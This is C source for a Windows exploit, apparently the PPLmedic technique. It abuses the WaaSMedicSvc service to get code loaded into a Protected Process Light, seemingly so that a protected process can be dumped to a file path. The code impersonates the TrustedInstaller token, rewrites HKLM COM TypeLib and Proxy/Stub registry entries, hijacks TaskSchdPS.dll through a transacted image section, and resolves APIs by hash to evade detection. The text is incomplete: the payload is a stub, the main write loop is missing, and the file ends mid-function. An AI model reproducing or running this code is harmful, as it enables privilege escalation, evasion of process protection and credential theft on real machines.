#include "ppl/ppl_medic.h"
#include "ppl/ppl_utils.h"

BOOL run_ppl_medic_exploit(
    IN LPCSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL duplicate_handle)
{
    BOOL   success                     = FALSE;
    BOOL   ret_val                     = FALSE;
    HANDLE hBaseNamedObjects           = NULL;
    LPWSTR TypeLibPath                 = NULL;
    LPWSTR TypeLibRegValuePath         = NULL;
    LPWSTR TypeLibOrigPath             = NULL;
    LPWSTR HollowedDllPath             = NULL;
    LPWSTR HijackedDllName             = NULL;
    LPWSTR HijackedDllSectionPath      = NULL;
    LPWSTR ProxyStubRegValuePath       = NULL;
    LPWSTR ProxyStubOrigPath           = NULL;
    LPWSTR WaaSMedicCapsulePath        = NULL;
    LPWSTR ProxyStubDllLoadEventName   = NULL;
    HANDLE hTI                         = NULL;
    BOOL   StateRegTypeLibModified     = FALSE;
    BOOL   StateRegProxyStubModified   = FALSE;
    BOOL   StatePluginDllLocked        = FALSE;
    PVOID  KnownDllDirectoryHandleAddr = NULL;
    HANDLE DllSectionHandle            = NULL;
    HANDLE DummyDllFileHandle          = NULL;
    HANDLE WaaSMedicCapsuleHandle      = NULL;
    HANDLE ProxyStubDllLoadEventHandle = NULL;

    success = enable_debug_priv();
    if (!success)
        goto cleanup;

    //
    // If WaaSMedicSvc is running, stop it first and then start it. We want to make sure we are
    // working in a "clean" environment. This is important to ensure that TaskSchdPS.dll is not
    // already loaded.
    //

    success = restart_waa_s_medic_svc();
    if (!success)
        goto cleanup;
    DPRINT("Service (re)started: %ls", STR_WAASMEDIC_SVC);

    //
    // Determine the value of the \BaseNamedObjects directory handle in the WaaSMedic process.
    // This will help us choose the strategy to adopt for the memory write.
    //

    success = find_waa_s_medic_svc_base_named_objects_handle(&hBaseNamedObjects);
    if (!success)
        goto cleanup;
    DPRINT("Directory handle value in remote process: 0x%04x", (ULONG32)(ULONG_PTR)hBaseNamedObjects);

    //
    // Create the TypeLib file, and modify the registry as TrustedInstaller to replace the 
    // original TypeLib file path.
    //

    success = generate_temp_path(&TypeLibPath);
    if (!success)
        goto cleanup;

    success = write_type_lib(TypeLibPath);
    if (!success)
        goto cleanup;

    success = get_type_lib_reg_value_path(&TypeLibRegValuePath);
    if (!success)
        goto cleanup;

    success = get_type_lib_orig_path(TypeLibRegValuePath, &TypeLibOrigPath);
    if (!success)
        goto cleanup;

    success = get_trusted_installer_token(&hTI);
    if (!success)
        goto cleanup;

    success = modify_type_lib_registry_value(
        TypeLibOrigPath,
        TypeLibRegValuePath,
        hTI,
        &StateRegTypeLibModified);
    if (!success)
        goto cleanup;

    DPRINT("TypeLib file created and set in the registry: %ls", TypeLibPath);

    //
    // Determine the address of the \KnownDlls directory handle. We need this information to
    // know where to write in the target process.
    //

    success = get_known_dlls_handle_address(&KnownDllDirectoryHandleAddr);
    if (!success)
    {
        PRINT_ERR("Failed to determine the address of LdrpKnownDllDirectoryHandle");
        goto cleanup;
    }
    DPRINT("Known DLL Directory handle @ 0x%p", KnownDllDirectoryHandleAddr);

    //
    // We will prepare the DLL hijacking of the 'TaskSchdPS.dll' DLL by 1. creating a section
    // in the object manager for our own DLL with a random name in the \BaseNamedObjects
    // directory, 2. modifying the registry to set this DLL as the Proxy Stub DLL for the
    // ITaskHandler interface.
    //

    success = get_hijacked_dll_name(&HijackedDllName, &HijackedDllSectionPath);
    if (!success)
        goto cleanup;

    success = map_payload_dll(HijackedDllName, HijackedDllSectionPath, &HollowedDllPath, &DllSectionHandle);
    if (!success)
        goto cleanup;

    success = create_dummy_dll_file(HijackedDllName, &DummyDllFileHandle);
    if (!success)
        goto cleanup;

    success = find_proxy_stub_registry_value_path(&ProxyStubRegValuePath);
    if (!success)
        goto cleanup;

    success = get_proxy_stub_orig_path(ProxyStubRegValuePath, &ProxyStubOrigPath);
    if (!success)
        goto cleanup;

    success = modify_proxy_stub_registry_value(hTI, ProxyStubRegValuePath, ProxyStubOrigPath, HijackedDllName, &StateRegProxyStubModified);
    if (!success)
        goto cleanup;
    DPRINT("Proxy/Stub DLL path set in the registry: %ls", HijackedDllName);

    //
    // The methods LaunchDetectionOnly and LaunchRemediationOnly both call the internal function
    // LoadPluginLibrary, which ultimately calls the LoadLibrary(Ex) API. This API throws an
    // exception if the KnownDlls handle is invalid. By locking the target DLL file, we can
    // force the service to fail before calling LoadLibrary(Ex) and therefore avoid the crash.
    // Another benefit is that it drastically increases the speed of the exploit.
    //

    success = get_waa_s_medic_capsule_path(&WaaSMedicCapsulePath);
    success = lock_plugin_dll(WaaSMedicCapsulePath, &StatePluginDllLocked, &WaaSMedicCapsuleHandle);
    if (!success)
        goto cleanup;
    DPRINT("Plugin DLL file locked: %ls", WaaSMedicCapsulePath);

    //
    // Prepare synchronization. We create a global Event, and start a watcher thread that waits
    // for it to be signaled in a loop.
    //

    ProxyStubDllLoadEventName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!ProxyStubDllLoadEventName)
    {
        malloc_failed();
        goto cleanup;
    }
    swprintf_s(ProxyStubDllLoadEventName, MAX_PATH, L"Global\\%ws", STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);
    ProxyStubDllLoadEventHandle = CreateEventW(NULL, TRUE, FALSE, ProxyStubDllLoadEventName);
    if (!ProxyStubDllLoadEventHandle)
    {
        function_failed("CreateEventW");
        goto cleanup;
    }

    //
    // Here we start writing random handle values where the \KnownDlls hande is normally stored in
    // a loop. After each write, we attempt to create a remote TaskHandler object. When this object
    // is created, the TaskSchdPS.dll DLL is loaded. So, if the handle value is correct, our version
    // of TaskSchdPS.dll should be loaded (as a "Known DLL"). Otherwise, the handle is not valid and
    // we repeat the operation until we succeed or we reach the maximum number of attempts.
    //

cleanup:
    if (hBaseNamedObjects)
        NtClose(hBaseNamedObjects);
    if (TypeLibPath)
        intFree(TypeLibPath);
    if (TypeLibRegValuePath)
        intFree(TypeLibRegValuePath);
    if (TypeLibOrigPath)
        intFree(TypeLibOrigPath);
    if (hTI)
        NtClose(hTI);
    if (TypeLibRegValuePath)
        intFree(TypeLibRegValuePath);
    if (DllSectionHandle)
        NtClose(DllSectionHandle);
    if (DummyDllFileHandle)
        NtClose(DummyDllFileHandle);
    if (ProxyStubRegValuePath)
        intFree(ProxyStubRegValuePath);
    if (ProxyStubOrigPath)
        intFree(ProxyStubOrigPath);
    if (WaaSMedicCapsuleHandle)
        NtClose(WaaSMedicCapsuleHandle);
    if (WaaSMedicCapsulePath)
        intFree(WaaSMedicCapsulePath);
    if (ProxyStubDllLoadEventName)
        intFree(ProxyStubDllLoadEventName);

    // TODO: StateRegTypeLibModified ?
    // TODO: StateRegProxyStubModified ?
    // TODO: StatePluginDllLocked ?

    return ret_val;
}

BOOL get_waa_s_medic_capsule_path(
    IN LPWSTR* WaaSMedicCapsulePath)
{
    BOOL   ret_val        = FALSE;
    BOOL   success        = FALSE;
    LPWSTR pwszModulePath = NULL;

    // TODO: add dinvoke

    //
    // Path on Windows 10: c:\windows\System32\WaaSMedicCapsule.dll
    // Path on Windows 11: c:\windows\UUS\amd64\WaaSMedicCapsule.dll
    //

    *WaaSMedicCapsulePath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!*WaaSMedicCapsulePath)
    {
        malloc_failed();
        goto cleanup;
    }

    pwszModulePath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszModulePath)
    {
        malloc_failed();
        goto cleanup;
    }

    success = GetSystemDirectoryW(pwszModulePath, MAX_PATH);
    if (!success)
    {
        function_failed("GetSystemDirectoryW");
        goto cleanup;
    }

    swprintf_s(pwszModulePath, MAX_PATH, L"%ws\\%ws", pwszModulePath, STR_WAASMEDIC_CAPSULE);

    if ((GetFileAttributesW(pwszModulePath) == INVALID_FILE_ATTRIBUTES) && (GetLastError() == ERROR_FILE_NOT_FOUND))
    {
        success = GetWindowsDirectoryW(pwszModulePath, MAX_PATH);
        if (!success)
        {
            function_failed("GetWindowsDirectoryW");
            goto cleanup;
        }

        swprintf_s(pwszModulePath, MAX_PATH, L"%ws\\UUS\\amd64\\%ws", pwszModulePath, STR_WAASMEDIC_CAPSULE);

        if ((GetFileAttributesW(pwszModulePath) == INVALID_FILE_ATTRIBUTES) && (GetLastError() == ERROR_FILE_NOT_FOUND))
        {
            PRINT_ERR("Failed to determine file path for file: %ls", STR_WAASMEDIC_CAPSULE);
            goto cleanup;
        }
    }

    swprintf_s(*WaaSMedicCapsulePath, MAX_PATH, L"%ws", pwszModulePath);
    ret_val = TRUE;

cleanup:
    safe_free((PVOID*)&pwszModulePath);

    return ret_val;
}

BOOL lock_plugin_dll(
    IN LPWSTR WaaSMedicCapsulePath,
    IN OUT PBOOL StatePluginDllLocked,
    OUT PHANDLE WaaSMedicCapsuleHandle)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;

    if (!*StatePluginDllLocked)
    {
        *WaaSMedicCapsuleHandle = CreateFileW(WaaSMedicCapsulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (*WaaSMedicCapsuleHandle == INVALID_HANDLE_VALUE)
        {
            function_failed("CreateFileW");
            goto cleanup;
        }
        
        success = LockFile(*WaaSMedicCapsuleHandle, 0, 0, 4096, 0);
        if (!success)
        {
            function_failed("LockFile");
            goto cleanup;
        }

        *StatePluginDllLocked = TRUE;
    }

    ret_val = TRUE;

cleanup:
    if (ret_val)
    {
        DPRINT("Lock: %d", *StatePluginDllLocked);
    }

    return ret_val;
}

BOOL find_proxy_stub_registry_value_path(
    OUT LPWSTR* ProxyStubRegistryValuePath)
{
    BOOL       ret_val            = FALSE;
    BOOL       success            = FALSE;
    LPWSTR     pwszRegPath        = NULL;
    LPWSTR     pwszProxyStubClsid = NULL;
    RPC_WSTR   InterfaceGuidStr   = NULL;
    UUID       InterfaceGuid      = IID_TASKHANDLER;
    RPC_STATUS rpc_status         = RPC_S_OK;

    UuidToStringW_t  UuidToStringW  = NULL;
    RpcStringFreeW_t RpcStringFreeW = NULL;

    UuidToStringW = (UuidToStringW_t)(ULONG_PTR)get_function_address(
        get_library_address(RPCRT4_DLL, TRUE),
        UuidToStringW_SW2_HASH,
        0);
    if (!UuidToStringW)
    {
        api_not_found("UuidToStringW");
        goto cleanup;
    }

    RpcStringFreeW = (RpcStringFreeW_t)(ULONG_PTR)get_function_address(
        get_library_address(RPCRT4_DLL, TRUE),
        RpcStringFreeW_SW2_HASH,
        0);
    if (!RpcStringFreeW)
    {
        api_not_found("RpcStringFreeW");
        goto cleanup;
    }

    //
    // HKLM\SOFTWARE\Classes\Interface\{839D7762-5121-4009-9234-4F0D19394F04}\ProxyStubClsid32
    //      (Default) -> {9C86F320-DEE3-4DD1-B972-A303F26B061E}
    // HKLM\SOFTWARE\Classes\CLSID\{9C86F320-DEE3-4DD1-B972-A303F26B061E}\InprocServer32
    //      (Default) -> C:\Windows\System32\TaskSchdPS.dll
    //

    *ProxyStubRegistryValuePath = intAlloc(MAX_PATH + 1);
    if (!*ProxyStubRegistryValuePath)
    {
        malloc_failed();
        goto cleanup;
    }

    pwszRegPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszRegPath)
    {
        malloc_failed();
        goto cleanup;
    }

    rpc_status = UuidToStringW(&InterfaceGuid, &InterfaceGuidStr);
    if (rpc_status != RPC_S_OK)
    {
        function_failed("UuidToStringW");
        goto cleanup;
    }

    swprintf_s(pwszRegPath, MAX_PATH, L"SOFTWARE\\Classes\\Interface\\{%ws}\\ProxyStubClsid32", (LPWSTR)InterfaceGuidStr);

    success = get_registry_string_value(HKEY_LOCAL_MACHINE, pwszRegPath, NULL, &pwszProxyStubClsid);
    if (!success)
        goto cleanup;

    swprintf_s(*ProxyStubRegistryValuePath, MAX_PATH, L"SOFTWARE\\Classes\\CLSID\\%ws\\InprocServer32", pwszProxyStubClsid);

    ret_val = TRUE;

cleanup:
    if (InterfaceGuidStr) RpcStringFreeW(&InterfaceGuidStr);
    safe_free((PVOID*)&pwszProxyStubClsid);
    safe_free((PVOID*)&pwszRegPath);

    return ret_val;
}

BOOL get_proxy_stub_orig_path(
    IN LPWSTR ProxyStubRegValuePath,
    OUT LPWSTR* ProxyStubOrigPath)
{
    BOOL   ret_val           = FALSE;
    BOOL   success           = FALSE;
    LPWSTR pwszProxyStubPath = NULL;

    *ProxyStubOrigPath = intAlloc(MAX_PATH + 1);
    if (!*ProxyStubOrigPath)
    {
        malloc_failed();
        goto cleanup;
    }

    success = get_registry_string_value(HKEY_LOCAL_MACHINE, ProxyStubRegValuePath, NULL, &pwszProxyStubPath);
    if (!success)
        goto cleanup;

    swprintf_s(*ProxyStubOrigPath, MAX_PATH, L"%ws", pwszProxyStubPath);

    ret_val = TRUE;

cleanup:
    safe_free((PVOID*)&pwszProxyStubPath);

    return ret_val;
}

BOOL modify_proxy_stub_registry_value(
    IN HANDLE hTI,
    IN LPWSTR ProxyStubRegValuePath,
    IN LPWSTR ProxyStubOrigPath,
    IN LPWSTR HijackedDllName,
    OUT PBOOL StateRegProxyStubModified)
{
    BOOL ret_val       = FALSE;
    BOOL success       = FALSE;
    BOOL bImpersonated = FALSE;

    RevertToSelf_t RevertToSelf = NULL;

    RevertToSelf = (RevertToSelf_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        RevertToSelf_SW2_HASH,
        0);
    if (!RevertToSelf)
    {
        api_not_found("RevertToSelf");
        return FALSE;
    }

    success = impersonate_trusted_installer(hTI);
    if (!success)
        goto cleanup;
    bImpersonated = TRUE;

    success = set_registry_string_value(HKEY_LOCAL_MACHINE, ProxyStubRegValuePath, NULL, HijackedDllName);
    if (!success)
        goto cleanup;

    *StateRegProxyStubModified = TRUE;
    ret_val = TRUE;

cleanup:
    if (bImpersonated) RevertToSelf();
    if (!ret_val)
    {
        PRINT_ERR("Failed to write Proxy/Stub DLL to registry: %ls", ProxyStubRegValuePath);
    }

    return ret_val;
}

BOOL create_dummy_dll_file(
    IN LPWSTR HijackedDllName,
    OUT PHANDLE DummyDllFileHandle)
{
    BOOL   ret_val      = FALSE;
    BOOL   success      = FALSE;
    LPWSTR pwszFilePath = NULL;
    HANDLE hFile        = NULL;
    
    pwszFilePath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszFilePath)
    {
        malloc_failed();
        goto cleanup;
    }

    success = GetWindowsDirectoryW(pwszFilePath, MAX_PATH);
    if (!success)
    {
        function_failed("GetWindowsDirectoryW");
        goto cleanup;
    }

    if (wcslen(pwszFilePath) < 2)
        goto cleanup;

    pwszFilePath[2] = L'\0';
    swprintf_s(pwszFilePath, MAX_PATH, L"%ws\\%ws", pwszFilePath, HijackedDllName);

    //
    // Be careful here, the loader will try to open the file with Read+Delete share mode. So, we must
    // not request write access to the file, otherwise the call (on the target service side) will fail
    // with an ERROR_SHARING_VIOLATION error.
    //
    hFile = CreateFileW(
        pwszFilePath,
        GENERIC_READ | DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        function_failed("CreateFileW");
        goto cleanup;
    }

    
    *DummyDllFileHandle = hFile;
    ret_val = TRUE;

cleanup:
    if (!ret_val)
        safe_close_handle(&hFile);

    safe_free((PVOID*)&pwszFilePath);

    return ret_val;
}

BOOL map_payload_dll(
    IN LPWSTR HijackedDllName,
    IN LPWSTR HijackedDllSectionPath,
    OUT LPWSTR* HollowedDllPath,
    OUT PHANDLE DllSectionHandle)
{
    BOOL              ret_val         = FALSE;
    BOOL              success         = FALSE;
    HANDLE            hTransaction    = NULL;
    HANDLE            hFileTransacted = NULL;
    LPVOID            pDllData        = NULL;
    DWORD             dwDllSize       = 0;
    DWORD             dwBytesWritten  = 0;
    UNICODE_STRING    SectionName     = { 0 };
    OBJECT_ATTRIBUTES oa              = { 0 };
    NTSTATUS          status          = ERROR_SUCCESS;

    CreateFileTransactedW_t  CreateFileTransactedW = NULL;

    CreateFileTransactedW = (CreateFileTransactedW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        CreateFileTransactedW_SW2_HASH,
        0);
    if (!CreateFileTransactedW)
    {
        api_not_found("CreateFileTransactedW");
        goto cleanup;
    }

    // TODO: add dinvoke
    // TODO: implement DLL
    char test_dll[] = { "MZ\xc3\xc3\xc3" };
    pDllData = test_dll;
    dwDllSize = sizeof(test_dll);

    success = find_writable_system_dll(dwDllSize, HollowedDllPath);
    if (!success)
    {
        DPRINT_ERR("Could not find a writeable system DLL");
        goto cleanup;
    }

    memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);

    status = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &oa, NULL, NULL, 0, 0, 0, NULL, NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateTransaction", status);
        goto cleanup;
    }

    hFileTransacted = CreateFileTransactedW(
        *HollowedDllPath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL);
    if (hFileTransacted == INVALID_HANDLE_VALUE)
    {
        function_failed("CreateFileTransactedW");
        goto cleanup;
    }

    success = WriteFile(hFileTransacted, pDllData, dwDllSize, &dwBytesWritten, NULL);
    if (!success)
    {
        function_failed("WriteFile");
        goto cleanup;
    }

    SectionName.Buffer = HijackedDllSectionPath;
    SectionName.Length = (USHORT)wcslen(SectionName.Buffer) * sizeof(WCHAR);
    SectionName.MaximumLength = SectionName.Length + 2;

    InitializeObjectAttributes(&oa, &SectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateSection(
        DllSectionHandle,
        SECTION_ALL_ACCESS,
        &oa,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFileTransacted);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateSection", status);
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    safe_close_handle(&hTransaction);
    safe_close_handle(&hFileTransacted);

    if (ret_val)
    {
        DPRINT("Section: %ls (handle: 0x%04x)", HijackedDllSectionPath, (ULONG32)(ULONG_PTR)*DllSectionHandle);
    }

    if (!ret_val)
    {
        PRINT_ERR("Failed to create section: %ls", HijackedDllSectionPath);
    }

    return ret_val;
}

BOOL get_type_lib_orig_path(
    IN LPWSTR TypeLibRegValuePath,
    OUT LPWSTR* TypeLibOrigPath)
{
    BOOL   ret_val         = FALSE;
    BOOL   success         = FALSE;
    LPWSTR pwszTypeLibPath = NULL;

    *TypeLibOrigPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!*TypeLibOrigPath)
    {
        malloc_failed();
        goto cleanup;
    }

    success = get_registry_string_value(HKEY_LOCAL_MACHINE, TypeLibRegValuePath, NULL, &pwszTypeLibPath);
    if (!success)
        goto cleanup;

    swprintf_s(*TypeLibOrigPath, MAX_PATH, L"%ws", pwszTypeLibPath);

    ret_val = TRUE;

cleanup:
    if (pwszTypeLibPath)
        intFree(pwszTypeLibPath);
    if (!ret_val && *TypeLibOrigPath)
    {
        intFree(*TypeLibOrigPath);
        *TypeLibOrigPath = NULL;
    }

    return ret_val;
}

BOOL get_trusted_installer_token(
    OUT PHANDLE hTI)
{
    //
    // https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html
    //

    BOOL                        ret_val        = FALSE;
    BOOL                        success        = FALSE;
    BOOL                        bImpersonation = FALSE;
    DWORD                       dwTiSvcStatus  = 0;
    DWORD                       dwTiSvcPid     = 0;
    HANDLE                      hSnapshot      = INVALID_HANDLE_VALUE, hThread = NULL;
    THREADENTRY32               ThreadEntry    = { 0 };
    SECURITY_QUALITY_OF_SERVICE Qos            = { 0 };
    NTSTATUS                    status         = STATUS_SUCCESS;
    LPCWSTR ppwszRequiredPrivileges[2] = {
        L"SeDebugPrivilege",
        L"SeImpersonatePrivilege"
    };

    CreateToolhelp32Snapshot_t CreateToolhelp32Snapshot = NULL;
    Thread32First_t            Thread32First            = NULL;
    Thread32Next_t             Thread32Next             = NULL;
    RevertToSelf_t             RevertToSelf             = NULL;

    CreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        CreateToolhelp32Snapshot_SW2_HASH,
        0);
    if (!CreateToolhelp32Snapshot)
    {
        api_not_found("CreateToolhelp32Snapshot");
        goto cleanup;
    }

    Thread32First = (Thread32First_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        Thread32First_SW2_HASH,
        0);
    if (!Thread32First)
    {
        api_not_found("Thread32First");
        goto cleanup;
    }

    Thread32Next = (Thread32Next_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        Thread32Next_SW2_HASH,
        0);
    if (!Thread32Next)
    {
        api_not_found("Thread32Next");
        goto cleanup;
    }

    RevertToSelf = (RevertToSelf_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        RevertToSelf_SW2_HASH,
        0);
    if (!RevertToSelf)
    {
        api_not_found("RevertToSelf");
        return FALSE;
    }

    success = check_token_privileges(
        NULL,
        ppwszRequiredPrivileges,
        ARRAY_SIZE(ppwszRequiredPrivileges),
        TRUE);
    if (!success)
        goto cleanup;

    success = get_service_status_by_name(STR_TI_SVC, &dwTiSvcStatus);
    if (!success)
        goto cleanup;

    if (dwTiSvcStatus != SERVICE_RUNNING)
    {
        DPRINT("Starting service %ls...", STR_TI_SVC);
        success = start_service_by_name(STR_TI_SVC, TRUE);
        if (!success)
            goto cleanup;
    }

    success = get_service_process_id(STR_TI_SVC, &dwTiSvcPid);
    if (!success)
        goto cleanup;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        function_failed("CreateToolhelp32Snapshot");
        goto cleanup;
    }

    memset(&ThreadEntry, 0, sizeof(ThreadEntry));
    ThreadEntry.dwSize = sizeof(ThreadEntry);

    success = Thread32First(hSnapshot, &ThreadEntry);
    if (!success)
        goto cleanup;

    do
    {
        if (ThreadEntry.th32OwnerProcessID == dwTiSvcPid)
        {
            // TODO: switch to syscall
            hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, ThreadEntry.th32ThreadID);
            if (hThread != NULL)
                break;
        }

    } while (Thread32Next(hSnapshot, &ThreadEntry));

    if (!hThread)
    {
        DPRINT_ERR("Failed to find a thread handle");
        goto cleanup;
    }

    memset(&Qos, 0, sizeof(Qos));
    Qos.Length = sizeof(Qos);
    Qos.ImpersonationLevel = SecurityImpersonation;

    status = NtImpersonateThread(NtGetCurrentThread(), hThread, &Qos);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtImpersonateThread", status);
        goto cleanup;
    }

    bImpersonation = TRUE;

    // TODO: use syscall equivalent
    success = OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, hTI);
    if (!success)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    if (bImpersonation)
        RevertToSelf();
    if (hThread)
        NtClose(hThread);
    if (hSnapshot)
        NtClose(hSnapshot);

    return ret_val;
}

BOOL impersonate_trusted_installer(
    IN HANDLE hTI)
{
    BOOL   ret_val = FALSE;
    HANDLE hThread = NULL;
    BOOL   success = FALSE;

    hThread = NtGetCurrentThread();

    // TODO: use syscall equivalent
    success = SetThreadToken(&hThread, hTI);
    if (!success)
    {
        function_failed("SetThreadToken");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL modify_type_lib_registry_value(
    IN LPWSTR TypeLibOrigPath,
    IN LPWSTR TypeLibRegValuePath,
    IN HANDLE hTI,
    OUT PBOOL StateRegTypeLibModified)
{
    BOOL ret_val       = FALSE;
    BOOL success       = FALSE;
    BOOL bImpersonated = FALSE;

    *StateRegTypeLibModified = FALSE;

    success = impersonate_trusted_installer(hTI);
    if (!success)
        goto cleanup;

    bImpersonated = TRUE;

    success = set_registry_string_value(HKEY_LOCAL_MACHINE, TypeLibRegValuePath, NULL, TypeLibOrigPath);
    if (!success)
        goto cleanup;

    *StateRegTypeLibModified = TRUE;
    ret_val = TRUE;

cleanup:
    if (bImpersonated)
        RevertToSelf();

    return ret_val;
}

BOOL write_type_lib(
    IN LPWSTR TypeLibPath)
{
    BOOL ret_val = FALSE;

    HRESULT hr = S_OK;
    UINT i, j, cNames;

    ITypeLib*  TypeLibOrig   = NULL;
    ITypeInfo* TypeInfoOrig  = NULL;
    TLIBATTR*  pTLibAttrOrig = NULL;
    TYPEATTR*  pTypeAttrOrig = NULL;
    FUNCDESC*  pFuncDescOrig = NULL;
    BSTR       TypeLibName   = NULL;

    //ITypeLib*  TypeLibRef  = NULL;
    ITypeInfo* TypeInfoRef = NULL;
    HREFTYPE   hRefType;
    BSTR       Names[8];

    ICreateTypeLib2* TypeLibNew   = NULL;
    ICreateTypeInfo* TypeInfoNew  = NULL;
    ICreateTypeInfo* TypeInfoNew2 = NULL;
    ELEMDESC         ldoParams[2];
    ELEMDESC         lroParams[3];

    UUID InterfaceGuid1 = IID_WAASREMEDIATIONEX;
    UUID InterfaceGuid2 = IID_TASKHANDLER;

    LoadTypeLib_t    LoadTypeLib    = NULL;
    CreateTypeLib2_t CreateTypeLib2 = NULL;
    SysAllocString_t SysAllocString = NULL;
    SysFreeString_t  SysFreeString  = NULL;

    LoadTypeLib = (LoadTypeLib_t)(ULONG_PTR)get_function_address(
        get_library_address(OLEAUT32_DLL, TRUE),
        LoadTypeLib_SW2_HASH,
        0);
    if (!LoadTypeLib)
    {
        api_not_found("LoadTypeLib");
        goto cleanup;
    }

    CreateTypeLib2 = (CreateTypeLib2_t)(ULONG_PTR)get_function_address(
        get_library_address(OLEAUT32_DLL, TRUE),
        CreateTypeLib2_SW2_HASH,
        0);
    if (!CreateTypeLib2)
    {
        api_not_found("CreateTypeLib2");
        goto cleanup;
    }

    SysAllocString = (SysAllocString_t)(ULONG_PTR)get_function_address(
        get_library_address(OLEAUT32_DLL, TRUE),
        SysAllocString_SW2_HASH,
        0);
    if (!SysAllocString)
    {
        api_not_found("SysAllocString");
        goto cleanup;
    }

    SysFreeString = (SysFreeString_t)(ULONG_PTR)get_function_address(
        get_library_address(OLEAUT32_DLL, TRUE),
        SysFreeString_SW2_HASH,
        0);
    if (!SysFreeString)
    {
        api_not_found("SysFreeString");
        goto cleanup;
    }

    hr = LoadTypeLib(STR_WAASMEDIC_TYPELIB, &TypeLibOrig); // Load the original TypeLib
    if (hr != S_OK)
    {
        function_failed("LoadTypeLib");
        goto cleanup;
    }

    hr = ITypeLib_GetLibAttr(TypeLibOrig, &pTLibAttrOrig);
    if (hr != S_OK)
    {
        function_failed("GetLibAttr");
        goto cleanup;
    }

    hr = CreateTypeLib2(pTLibAttrOrig->syskind, TypeLibPath, &TypeLibNew); // Create a new TypeLib
    if (hr != S_OK)
    {
        function_failed("CreateTypeLib2");
        goto cleanup;
    }

    hr = ICreateTypeLib2_SetGuid(TypeLibNew, &pTLibAttrOrig->guid);
    if (hr != S_OK)
    {
        function_failed("SetGuid");
        goto cleanup;
    }

    hr = ICreateTypeLib2_SetLcid(TypeLibNew, pTLibAttrOrig->lcid);
    if (hr != S_OK)
    {
        function_failed("SetLcid");
        goto cleanup;
    }

    hr = ICreateTypeLib2_SetVersion(TypeLibNew, pTLibAttrOrig->wMajorVerNum, pTLibAttrOrig->wMinorVerNum);
    if (hr != S_OK)
    {
        function_failed("SetVersion");
        goto cleanup;
    }

    //
    // BEGIN: Write the IWaaSRemediationEx interface
    //

    hr = ITypeLib_GetTypeInfoOfGuid(TypeLibOrig, &InterfaceGuid1, &TypeInfoOrig); // Get info about IWaaSRemediationEx interface
    if (hr != S_OK)
    {
        function_failed("GetTypeInfoOfGuid");
        goto cleanup;
    }

    hr = ITypeInfo_GetTypeAttr(TypeInfoOrig, &pTypeAttrOrig); // Get interface content
    if (hr != S_OK)
    {
        function_failed("GetTypeAttr");
        goto cleanup;
    }

    hr = ITypeInfo_GetDocumentation(TypeInfoOrig, MEMBERID_NIL, &TypeLibName, NULL, NULL, NULL); // Get TypeLib name
    if (hr != S_OK)
    {
        function_failed("GetDocumentation");
        goto cleanup;
    }

    hr = ICreateTypeLib2_CreateTypeInfo(TypeLibNew, TypeLibName, TKIND_INTERFACE, &TypeInfoNew); // Type: "dispatch" to "interface"
    if (hr != S_OK)
    {
        function_failed("CreateTypeInfo");
        goto cleanup;
    }

    hr = ICreateTypeInfo_SetTypeFlags(TypeInfoNew, TYPEFLAG_FHIDDEN | TYPEFLAG_FDUAL | TYPEFLAG_FNONEXTENSIBLE | TYPEFLAG_FOLEAUTOMATION);
    if (hr != S_OK)
    {
        function_failed("SetTypeFlags");
        goto cleanup;
    }

    hr = ICreateTypeInfo_SetGuid(TypeInfoNew, &pTypeAttrOrig->guid);
    if (hr != S_OK)
    {
        function_failed("SetGuid");
        goto cleanup;
    }

    hr = ICreateTypeInfo_SetVersion(TypeInfoNew, pTypeAttrOrig->wMajorVerNum, pTypeAttrOrig->wMinorVerNum);
    if (hr != S_OK)
    {
        function_failed("SetVersion");
        goto cleanup;
    }

    // Add references to implemented interfaces
    for (i = 0; i < pTypeAttrOrig->cImplTypes; i++)
    {

        hr = ITypeInfo_GetRefTypeOfImplType(TypeInfoOrig, i, &hRefType);
        if (hr != S_OK)
            continue;

